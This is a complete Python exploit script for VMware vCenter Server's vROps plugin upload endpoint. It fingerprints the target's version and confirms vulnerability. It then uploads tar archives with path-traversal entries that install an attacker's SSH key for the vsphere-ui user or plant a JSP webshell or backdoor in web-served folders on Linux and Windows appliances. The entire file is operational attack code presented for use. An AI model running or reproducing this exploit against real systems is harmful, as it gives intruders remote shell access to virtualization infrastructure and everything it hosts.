import os, tarfile, sys, optparse, requests
requests.packages.urllib3.disable_warnings()

PROXY = {}
SM_TEMPLATE = b'''<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>'''
URL = FILE = PATH = TYPE = None
ENDPOINT = "/ui/vropspluginui/rest/services/uploadova"


def parseArguments(options):
    global URL, FILE, TYPE, PATH, PROXY
    
    if not options.url or not options.file: 
        exit('[-] Error: please provide at least an URL and a FILE to upload.')
    
    # Get and normalize url
    URL = options.url
    if URL[-1:] == '/': 
        URL = URL[:-1]
    if not URL[:4].lower() == 'http': 
        URL = 'https://' + URL

    # Get file
    FILE = options.file
    if not os.path.exists(FILE): 
        exit('[-] File not found: ' + FILE)

    # Get type
    TYPE = 'ssh'
    if options.type: 
        TYPE = options.type

    # Get path
    if options.rpath: PATH = options.rpath
    else: 
        PATH = None

    # Get proxy
    if options.proxy: 
        PROXY = {'https': options.proxy}

def getVersion(URL):
    def getValue(RESPONSE, TAG = 'vendor'):
        try: 
            return RESPONSE.split('<' + TAG + '>')[1].split('</' + TAG + '>')[0]
        except: 
            pass
        return ''
    RESPONSE = requests.post(URL + '/sdk', verify = False, proxies = PROXY, timeout = 5, data = SM_TEMPLATE)
    if RESPONSE.status_code == 200:
        sResult = RESPONSE.text
        if not 'VMware' in getValue(sResult, 'vendor'):
            exit('[-] Not a VMware system: ' + URL)
        else:
            NAME = getValue(sResult, 'name')
            VERSION = getValue(sResult, 'version') # e.g. 7.0.0
            BUILD = getValue(sResult, 'build') # e.g. 15934073
            FULL = getValue(sResult, 'fullName')
            print('[+] Identified: ' + FULL)
            return VERSION, BUILD
    exit('[-] Not a VMware system: ' + URL)

def verify(URL):
    URL += ENDPOINT
    try:
        RESPONSE = requests.get(URL, verify=False, proxies = PROXY, timeout = 5)
    except:
        exit('[-] System not available: ' + URL)
    if RESPONSE.status_code == 405: 
        return True # A patched system returns 401, but also if it is not booted completely
    else: 
        return False

def createLinuxTar(FILE, TYPE, VERSION, BUILD, PATH = None):
    def getResourcePath():
        RESPONSE = requests.get(URL + '/ui', verify = False, proxies = PROXY, timeout = 5)
        return RESPONSE.text.split('static/')[1].split('/')[0]
    
    TAR_FILE = tarfile.open('payloadLinux.tar','w')
    if PATH:
        if PATH[0] == '/': 
            PATH = PATH[1:]
        PAYLOAD_PATH = '../../' + PATH
        TAR_FILE.add(FILE, arcname=PAYLOAD_PATH)
        TAR_FILE.close()
        return 'absolute'
    elif TYPE.lower() == 'ssh':
        PAYLOAD_PATH = '../../home/vsphere-ui/.ssh/authorized_keys'
        TAR_FILE.add(FILE, arcname=PAYLOAD_PATH)
        TAR_FILE.close()
        return 'ssh'
    elif (int(VERSION.split('.')[0]) == 6 and int(VERSION.split('.')[1]) == 5) or (int(VERSION.split('.')[0]) == 6 and int(VERSION.split('.')[1]) == 7 and int(BUILD) < 13010631):
        # vCenter 6.5/6.7 < 13010631, just this location with a subnumber
        PAYLOAD_PATH = '../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/' + os.path.basename(FILE)
        print('[!] Uploadpath: ' + PAYLOAD_PATH[5:])
        for i in range(112): 
            TAR_FILE.add(FILE, arcname=PAYLOAD_PATH % i)
        TAR_FILE.close()
        return 'webshell'
    elif (int(VERSION.split('.')[0]) == 6 and int(VERSION.split('.')[1]) == 7 and int(BUILD) >= 13010631):
        # vCenter 6.7 >= 13010631, webshell not an option, but backdoor works when put at /usr/lib/vmware-vsphere-ui/server/static/resources/libs/<thefile>
        PAYLOAD_PATH = '../../usr/lib/vmware-vsphere-ui/server/static/resources/libs/' + os.path.basename(FILE)
        print('[!] Uploadpath: ' + PAYLOAD_PATH[5:])
        TAR_FILE.add(FILE, arcname=PAYLOAD_PATH)
        TAR_FILE.close()
        return 'backdoor'
    else: # elif(int(VERSION.split('.')[0]) == 7 and int(VERSION.split('.')[1]) == 0):
        # vCenter 7.0, backdoor webshell, but dynamic location (/usr/lib/vmware-vsphere-ui/server/static/resources15863815/libs/<thefile>)
        PAYLOAD_PATH = '../../usr/lib/vmware-vsphere-ui/server/static/' + getResourcePath() + '/libs/' + os.path.basename(FILE)
        print('[!] Uploadpath: ' + PAYLOAD_PATH[5:])
        TAR_FILE.add(FILE, arcname=PAYLOAD_PATH)
        TAR_FILE.close()
        return 'backdoor'
    

def createWindowsTar(FILE, PATH = None):
    # vCenter only (uploaded as administrator), vCenter 7+ did not exist for Windows
    if PATH:
        if PATH[0] == '/': 
            PATH = PATH[:1]
        PAYLOAD_PATH = '../../' + PATH
    else:
        PAYLOAD_PATH = '../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/' + os.path.basename(FILE)
    TAR_FILE = tarfile.open('payloadWindows.tar','w')
    TAR_FILE.add(FILE, arcname=PAYLOAD_PATH)
    TAR_FILE.close()

def uploadFile(URL, UPLOAD_TYPE, FILE):
    FILE = os.path.basename(FILE)
    uploadURL = URL +  ENDPOINT
    linuxUploadFile = {'uploadFile': ('tmp.tar', open('payloadLinux.tar', 'rb'), 'application/octet-stream')}
    
    # Linux
    RESPONSE = requests.post(uploadURL, files = linuxUploadFile, verify = False, proxies = PROXY)
    if RESPONSE.status_code == 200:
        if RESPONSE.text == 'SUCCESS':
            print('[+] Linux payload uploaded succesfully.')
            if UPLOAD_TYPE == 'ssh':
                print('[+] SSH key installed for user \'vsphere-ui\'.')
                print('     Please run \'ssh vsphere-ui@' + URL.replace('https://','') + '\'')
                return True
            elif UPLOAD_TYPE == 'webshell':
                webShell = URL + '/ui/resources/' + FILE
                RESPONSE = requests.get(webShell, verify=False, proxies = PROXY)
                if RESPONSE.status_code != 404:
                    print('[+] Webshell verified, please visit: ' + webShell)
                    return True
            elif UPLOAD_TYPE == 'backdoor':
                webShell = URL + '/ui/resources/' + FILE
                print('[+] Backdoor ready, please reboot or wait for a reboot')
                print('     then open: ' + webShell)
            else:
                pass


    # Windows
    windowsUploadFile = {'uploadFile': ('tmp.tar', open('payloadWindows.tar', 'rb'), 'application/octet-stream')}
    RESPONSE = requests.post(uploadURL, files=windowsUploadFile, verify = False, proxies = PROXY)
    if RESPONSE.status_code == 200:
        if RESPONSE.text == 'SUCCESS':
            print('[+] Windows payload uploaded succesfully.')
            if UPLOAD_TYPE == 'backdoor':
                print('[+] Absolute upload looks OK')
                return True
            else:
                webShell = URL + '/statsreport/' + FILE
                RESPONSE = requests.get(webShell, verify=False, proxies = PROXY)
                if RESPONSE.status_code != 404:
                    print('[+] Webshell verified, please visit: ' + webShell)
                    return True
    return False

if __name__ == "__main__":
    usage = (
        'Usage: %prog [option]\n'
        'Exploiting Windows & Linux vCenter Server\n'
        'Create SSH keys: ssh-keygen -t rsa -f id_rsa -q -N \'\'\n'
        '# Note1: Since the 6.7U2+ (b13010631) Linux appliance, the webserver is in memory. Webshells only work after reboot\n'
        '# Note2: Windows is the most vulnerable, but less mostly deprecated anyway')

    parser = optparse.OptionParser(usage=usage)
    parser.add_option('--url', '-u', dest='url', help='Required; example https://192.168.0.1')
    parser.add_option('--file', '-f', dest='file', help='Required; file to upload: e.g. id_rsa.pub in case of ssh or webshell.jsp in case of webshell')
    parser.add_option('--type', '-t', dest='type', help='Optional; ssh/webshell, default: ssh')
    parser.add_option('--rpath', '-r', dest='rpath', help='Optional; specify absolute remote path, e.g. /tmp/testfile or /Windows/testfile')
    parser.add_option('--proxy', '-p', dest='proxy', help='Optional; configure a HTTPS proxy, e.g. http://127.0.0.1:8080')
    
    (options, args) = parser.parse_args()
       
    parseArguments(options)
       
    # Verify
    if verify(URL): 
        print('[+] Target vulnerable: ' + URL)
    else: 
        exit('[-] Target not vulnerable: ' + URL)
    
    # Read out the version
    VERSION, BUILD = getVersion(URL)
    if PATH: 
        print('[!] Upload your file to ' + PATH)
    elif TYPE.lower() == 'ssh': 
        print('[!] SSH keyfile: \'' + FILE + '\'')
    else: 
        print('[!] Webshell: \'' + FILE + '\'')

    # Create TAR file
    UPLOAD_TYPE = createLinuxTar(FILE, TYPE, VERSION, BUILD, PATH)
    if not UPLOAD_TYPE == 'ssh':
        createWindowsTar(FILE, PATH)

    # Upload and verify
    uploadFile(URL, UPLOAD_TYPE, FILE)
    